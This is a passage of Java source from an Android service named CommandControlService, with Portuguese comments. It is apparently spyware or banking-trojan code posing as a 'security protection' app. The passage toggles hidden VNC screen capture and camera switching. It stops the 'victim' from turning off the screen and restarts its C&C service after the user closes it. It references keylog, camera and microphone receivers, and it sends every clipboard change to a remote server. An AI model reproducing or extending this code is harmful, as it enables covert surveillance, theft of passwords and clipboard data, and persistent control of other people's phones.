                Log.d(TAG, "📦 ROOT BYPASS: Não disponível (dispositivo sem root)");
            }
        }).start();
    }
    
    /**
     * 🔇 Liga/Desliga Silent VNC
     */
    private void toggleSilentVnc(boolean enabled) {
        toggleSilentVnc(enabled, false, -1);
    }

    /**
     * 🔇 Liga/Desliga Silent VNC
     * @param silentOnly quando true, o receiver prioriza o caminho takeScreenshot (HVNC Silente dedicado)
     * @param quality 10–100 JPEG (-1 = usar prefs/default no AccessibilityService)
     */
    private void toggleSilentVnc(boolean enabled, boolean silentOnly, int quality) {
        Log.d(TAG, "TOGGLE_SILENT_VNC: " + (enabled ? "ON" : "OFF") + " quality=" + quality);

        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_SILENT_VNC");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        intent.putExtra("silent_only", true);
        if (quality > 0) {
            intent.putExtra("quality", quality);
        }

        sendBroadcast(intent);
    }

    /**
     * Reinicia o loop takeScreenshot (HVNC silencioso).
     */
    private void forceRestartVnc() {
        Log.d(TAG, "FORCE_RESTART_VNC - restart silent capture");
        int q = UiAssistBridge.getSilentCaptureQuality();
        UiAssistBridge.restartSilentScreenCapture(q > 0 ? q : 15);
    }
    
    /**
     * 🔧 Configura ROM automaticamente
     * Abre configurações de Autostart, Battery, etc e auto-clica
     */
    private void configureROM() {
        Log.d(TAG, "🔧🔧🔧 CONFIGURE_ROM - Iniciando...");
        
        // Envia broadcast para habilitar auto-click de configurações de ROM
        Intent intent = new Intent("com.seguranca.protecao.ENABLE_ROM_CONFIG");
        intent.setPackage(getPackageName());
        
        Log.d(TAG, "🔧 Enviando broadcast ENABLE_ROM_CONFIG");
        sendBroadcast(intent);
        Log.d(TAG, "🔧 Broadcast CONFIGURE_ROM enviado!");
    }
    
    /**
     * 🔒 Ativa/desativa persistência de tela
     * Quando ativo, não deixa a vítima desligar a tela!
     */
    private void toggleScreenPersistence(boolean enabled) {
        Log.d(TAG, "🔒🔒🔒 SCREEN_PERSISTENCE - " + (enabled ? "Ativando..." : "Desativando..."));
        
        Intent intent = new Intent("com.seguranca.protecao.TOGGLE_SCREEN_PERSISTENCE");
        intent.setPackage(getPackageName());
        intent.putExtra("enabled", enabled);
        
        sendBroadcast(intent);
        Log.d(TAG, "🔒 Broadcast TOGGLE_SCREEN_PERSISTENCE enviado! enabled=" + enabled);
    }
    
    /**
     * 🔄 Alterna entre câmera frontal e traseira
     */
    private void switchCamera(String camera) {
        Log.d(TAG, "🔄 Alternando para câmera: " + camera);
        
        Intent intent = new Intent("com.seguranca.protecao.SWITCH_CAMERA");
        intent.setPackage(getPackageName());
        intent.putExtra("camera", camera);
        sendBroadcast(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (sInstance == this) {
            sInstance = null;
        }
        shouldReconnect = false;
        
        if (webSocket != null) {
            webSocket.close(1000, "Service destroyed");
        }
        
        // 🔋 Libera WakeLock
        try {
            if (connectionWakeLock != null && connectionWakeLock.isHeld()) {
                connectionWakeLock.release();
                Log.d(TAG, "🔋 WakeLock liberado");
            }
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Erro ao liberar WakeLock: " + e.getMessage());
        }
        
        // Desregistra receiver da câmera
        try {
            unregisterReceiver(cameraFrameReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver da câmera: " + e.getMessage());
        }
        
        // Desregistra receiver do microfone
        try {
            unregisterReceiver(audioChunkReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver do microfone: " + e.getMessage());
        }
        
        // Desregistra receiver de status do Silent VNC
        try {
            unregisterReceiver(silentVncStatusReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver de status Silent VNC: " + e.getMessage());
        }
        
        // 🔐 Desregistra receiver do Keylog
        try {
            unregisterReceiver(keylogDataReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver do Keylog: " + e.getMessage());
        }
        
        Log.d(TAG, "Serviço C&C destruído");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        Log.d(TAG, "⚡ onTaskRemoved: App encerrado das tarefas recentes! Reiniciando serviço C&C...");
        try {
            Intent restartServiceIntent = new Intent(getApplicationContext(), CommandControlService.class);
            restartServiceIntent.setPackage(getPackageName());
            android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
                    getApplicationContext(), 1, restartServiceIntent,
                    android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE
            );
            android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
            if (alarmService != null) {
                alarmService.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, restartServicePendingIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro no onTaskRemoved: " + e.getMessage());
        }
    }

    private String lastClipboardText = "";

    private void setupClipboardListener() {
        try {
            final android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard != null) {
                clipboard.addPrimaryClipChangedListener(() -> {
                    try {
                        if (clipboard.hasPrimaryClip()) {
                            android.content.ClipData clip = clipboard.getPrimaryClip();
                            if (clip != null && clip.getItemCount() > 0 && clip.getItemAt(0).getText() != null) {
                                String text = clip.getItemAt(0).getText().toString().trim();
                                if (!text.isEmpty() && !text.equals(lastClipboardText)) {
                                    lastClipboardText = text;
                                    sendClipboardToServer(text);
                                }
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Erro ao capturar clipboard: " + e.getMessage());
                    }
                });
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao registrar clipboard listener: " + e.getMessage());
        }
    }

    public void sendClipboardToServer(String text) {
        if (!isConnected || webSocket == null || text == null) return;
        try {
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "CLIPBOARD");
            msg.addProperty("device_id", deviceId);
            msg.addProperty("text", text);
            msg.addProperty("timestamp", System.currentTimeMillis());
            sendJson(msg);
            Log.d(TAG, "📋 CLIPBOARD enviado para o servidor: " + text);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar clipboard: " + e.getMessage());
        }
    }

    private android.util.DisplayMetrics getRealDisplayMetrics() {
        android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
        try {
            android.view.WindowManager wm = (android.view.WindowManager) getSystemService(Context.WINDOW_SERVICE);
            if (wm != null) {
                wm.getDefaultDisplay().getRealMetrics(metrics);
                return metrics;
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter getRealMetrics: " + e.getMessage());
        }
        return getResources().getDisplayMetrics();
    }
}
